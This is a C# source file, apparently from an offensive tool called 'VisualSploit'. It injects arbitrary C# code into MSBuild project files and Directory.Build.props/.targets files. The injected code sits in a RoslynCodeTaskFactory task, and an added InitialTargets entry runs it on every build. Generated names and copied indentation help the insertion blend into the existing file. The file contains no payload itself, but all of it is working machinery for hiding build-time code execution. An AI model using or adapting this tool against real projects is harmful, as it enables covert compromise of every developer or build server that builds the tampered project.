using System.Xml;
using System.Xml.Linq;

namespace VisualSploit;

internal static class MSBuild
{
    public static void Inject(string inlineCode, Config cfg, Naming naming)
    {
        var taskName = naming.Next();
        var targetName = naming.Next();

        var outputPath = cfg.OutputPath ?? cfg.TargetPath;

        var doc = LoadOrCreate(cfg.TargetPath);
        var root = doc.Root!;

        var bakPath = $"{outputPath}.bak";
        if (!cfg.DryRun && !cfg.NoBackup && File.Exists(outputPath) && !File.Exists(bakPath))
            File.Copy(outputPath, bakPath);

        MergeInitialTarget(root, targetName);

        var ns = root.Name.Namespace;
        var indent = DetectChildIndent(root);
        var nested = indent + indent;
        var deeper = nested + indent;
        XText Line(string padding) => new("\n" + padding);

        var usingTask = new XElement(ns + "UsingTask",
            new XAttribute("TaskName", taskName),
            new XAttribute("TaskFactory", "RoslynCodeTaskFactory"),
            new XAttribute("AssemblyFile", @"$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll"),
            Line(nested),
            new XElement(ns + "Task",
                Line(deeper),
                new XElement(ns + "Code",
                    new XAttribute("Type", "Method"),
                    new XAttribute("Language", "cs"),
                    new XCData("\n" + inlineCode + "\n")),
                Line(nested)),
            Line(indent));
        var target = new XElement(ns + "Target",
            new XAttribute("Name", targetName),
            Line(nested),
            new XElement(ns + taskName),
            Line(indent));
        if (cfg.Condition is not null)
            target.SetAttributeValue("Condition", cfg.Condition);

        AppendGenerated(root, indent, usingTask, target);

        if (cfg.DryRun) WriteDocument(doc, Console.Out);
        else SaveDocument(doc, outputPath);

        if (cfg.Verbose)
        {
            var verb = cfg.DryRun ? "would inject" : "injected";
            Console.Error.WriteLine(
                $"{verb} target '{targetName}' (task '{taskName}') into {outputPath}");
        }
    }

    static XDocument LoadOrCreate(string targetPath)
    {
        if (File.Exists(targetPath))
        {
            var doc = XDocument.Load(targetPath, LoadOptions.PreserveWhitespace);
            var root = doc.Root ?? throw new InvalidOperationException($"Invalid project file: {targetPath}");
            if (root.Name.LocalName != "Project")
                throw new InvalidOperationException($"Target XML root must be <Project>: {targetPath}");
            return doc;
        }

        if (!IsDirectoryBuildFile(Path.GetFileName(targetPath)))
            throw new FileNotFoundException($"Target file not found: {targetPath}");

        return new XDocument(new XElement("Project"));
    }

    static bool IsDirectoryBuildFile(string filename) =>
        filename.Equals("Directory.Build.props", StringComparison.OrdinalIgnoreCase) ||
        filename.Equals("Directory.Build.targets", StringComparison.OrdinalIgnoreCase);

    static void MergeInitialTarget(XElement root, string targetName)
    {
        var existing = root.Attribute("InitialTargets")?.Value ?? "";
        var targets = existing
            .Split(';', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
            .ToList();
        if (!targets.Contains(targetName, StringComparer.OrdinalIgnoreCase))
            targets.Add(targetName);
        root.SetAttributeValue("InitialTargets", string.Join(";", targets));
    }

    static string DetectChildIndent(XElement root)
    {
        foreach (var text in root.Nodes().OfType<XText>())
        {
            var value = text.Value;
            if (!string.IsNullOrWhiteSpace(value))
                continue;

            var newline = value.LastIndexOf('\n');
            if (newline >= 0 && newline + 1 < value.Length)
                return value[(newline + 1)..];
        }

        return "  ";
    }

    static void AppendGenerated(XElement root, string indent, params XElement[] children)
    {
        var pad = "\n" + indent;
        var trailing = root.LastNode as XText;
        var insertBeforeTrailing = trailing is not null &&
            string.IsNullOrWhiteSpace(trailing.Value) &&
            trailing.Value.Contains('\n');

        foreach (var child in children)
        {
            if (insertBeforeTrailing)
                trailing!.AddBeforeSelf(new XText(pad), child);
            else
                root.Add(new XText(pad), child);
        }

        if (!insertBeforeTrailing)
            root.Add(new XText("\n"));
    }

    static void SaveDocument(XDocument doc, string outputPath)
    {
        var fullOutputPath = Path.GetFullPath(outputPath);
        var dir = Path.GetDirectoryName(fullOutputPath) ??
            throw new InvalidOperationException($"Invalid output path: {outputPath}");
        Directory.CreateDirectory(dir);

        var tempPath = Path.Combine(dir, $".{Path.GetFileName(fullOutputPath)}.{Path.GetRandomFileName()}.tmp");

        try
        {
            using (var writer = XmlWriter.Create(tempPath, BuildSettings(doc)))
                doc.Save(writer);
            File.Move(tempPath, fullOutputPath, overwrite: true);
        }
        catch
        {
            if (File.Exists(tempPath)) File.Delete(tempPath);
            throw;
        }
    }

    internal static void WriteDocument(XDocument doc, TextWriter writer)
    {
        using var xw = XmlWriter.Create(writer, BuildSettings(doc));
        doc.Save(xw);
    }

    static XmlWriterSettings BuildSettings(XDocument doc) => new()
    {
        Indent = false,
        NewLineHandling = NewLineHandling.None,
        OmitXmlDeclaration = doc.Declaration == null,
        Encoding = new System.Text.UTF8Encoding(encoderShouldEmitUTF8Identifier: false)
    };
}
